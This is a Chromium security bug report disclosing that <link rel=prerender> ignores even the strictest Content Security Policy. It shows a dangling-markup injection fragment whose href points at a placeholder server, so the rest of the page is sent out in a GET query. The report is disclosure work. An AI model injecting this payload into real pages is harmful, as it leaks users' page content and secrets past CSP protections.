ch...@google.com： <h1>Steps to reproduce the problem</h1> <ol> <li>Change href in the attached prerender.html accordingly.</li> <li>Open prerender.html in a window, preferably a Guest one since prerender does not work in Incognito.</li> </ol> <h1>Problem Description</h1> <p>Even when CSP is configured in the strictest form, i.e. <code>default-src: &#39;none&#39;</code>, <code>&lt;link rel=&quot;prerender&quot;&gt;</code> connects and sends a GET request to an arbitrary URL. Combined with Dangling Markup Injection, it may be possible for an attacker to inject <code>&lt;link rel=&quot;prerender&quot; href=&#39;https://server/?</code> where the rest of the markup is sent to the server in a GET query.</p> <p>Similar issues include 40085912 and 40092640. The former issue fixes some of the issues brought by other pre- keywords. The latter issue makes use of <code>rel=dns-prefetch</code> and <code>rel=preconnect</code>, but requires an attacker-controlled script with lenient CSP policies to execute exfiltration. The current issue only requires a markup injection, and works on pages with the strictest CSP policy.</p> <p>Some of the comments in the issues note that it is a limitation of CSP. From what I can understand, CSP has been amended<a href="https://github.com/w3c/webappsec-csp/pull/582" data-b-widget="url" data-b-original-href="https://github.com/w3c/webappsec-csp/pull/582" data-b-redirected-href="https://www.google.com/url?q=https://github.com/w3c/webappsec-csp/pull/582&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0SxieuDYnB8-YZ9G7FlzH9">^1</a> that resource hints like <code>preconnect</code>, <code>dns-prefetch</code>, <code>prerender</code> should follow the <code>default-src</code> directive. CSP 3&#39;s Directive Algorithms seem to also state the same<a href="https://www.w3.org/TR/CSP3/#effective-directive-for-a-request" data-b-widget="url" data-b-original-href="https://www.w3.org/TR/CSP3/#effective-directive-for-a-request" data-b-redirected-href="https://www.google.com/url?q=https://www.w3.org/TR/CSP3/%23effective-directive-for-a-request&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Wrc1AGpx6lda7oEYz_ZgV">^2</a>, which the current issue shows otherwise.</p> <h1>Summary</h1> <p>link rel prerender may be used to exfiltrate markup under strict CSP</p> <h1>Custom Questions</h1> <h4>Reporter credit:</h4> <p>Dongsung &quot;Donny&quot; Kim (@kid1ng)</p> <h1>Additional Data</h1> <p>Category: Security <br> Chrome Channel: Stable <br> Regression: N/A</p>
